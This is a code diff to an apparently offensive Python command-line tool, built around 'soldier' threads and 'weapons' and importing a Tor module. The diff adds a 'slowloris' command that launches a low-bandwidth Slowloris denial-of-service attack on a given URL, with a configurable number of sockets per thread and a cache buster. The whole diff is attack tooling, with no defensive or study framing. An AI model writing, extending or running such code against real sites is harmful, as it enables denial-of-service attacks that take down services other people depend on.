@@ -5,6 +5,7 @@ import app.net
 import app.tor
 from app.command import Platoon
 from app.weapons.singleshot import SingleShotFactory
+from app.weapons.slowloris import SlowLorisFactory
 import fire
 import signal
 import sys
@@ -66,6 +67,35 @@ class CLI:
 
         self._shutdown()
 
+    def slowloris(self, target, num_sockets=100):
+        """
+        Run a slow loris, low bandwidth attack on the given URL / domain.
+        :param target: The target URL of the attack
+        :param num_sockets: The number of sockets to open for each soldier thread
+        """
+
+        try:
+
+            self._init()
+
+            app.console.system("running slowloris")
+
+            weapon_factory = SlowLorisFactory(
+                http_method=self._http_method,
+                cache_buster=self._cache_buster,
+                num_sockets=num_sockets
+            )
+
+            self._platoon.attack(
+                weapon_factory=weapon_factory,
+                target_url=target
+            )
+
+        except Exception as ex:
+
+            app.console.error(str(ex))
+
+        self._shutdown()
 
     def _init(self):
 
